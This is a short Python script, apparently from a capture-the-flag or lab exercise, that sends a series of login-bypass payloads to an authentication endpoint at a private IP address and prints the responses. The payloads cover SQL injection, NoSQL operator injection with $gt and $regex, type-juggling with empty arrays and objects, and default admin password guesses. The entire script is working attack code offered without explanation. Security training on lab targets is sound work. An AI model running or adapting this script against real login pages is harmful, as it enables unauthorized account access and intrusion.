import requests

url = 'http://10.129.184.228:3000/auth/login'

payloads = [
    ('SQLi 1', {'username': 'admin\' OR 1=1 --', 'password': 'x'}),
    ('SQLi 2', {'username': 'admin\" OR 1=1 --', 'password': 'x'}),
    ('NoSQL $gt', {'username': {'$gt': ''}, 'password': {'$gt': ''}}),
    ('NoSQL $regex', {'username': {'$regex': '.*'}, 'password': {'$regex': '.*'}}),
    ('Type Juggling Array', {'username': 'admin', 'password': []}),
    ('Type Juggling Object', {'username': 'admin', 'password': {}}),
    ('Admin exact', {'username': 'admin', 'password': 'password'}),
    ('Admin exact 2', {'username': 'admin', 'password': 'admin'}),
]

for name, payload in payloads:
    try:
        r = requests.post(url, json=payload, timeout=5)
        print(f'{name}: {r.status_code} - {r.text[:100]}')
    except Exception as e:
        print(f'{name}: Failed - {e}')
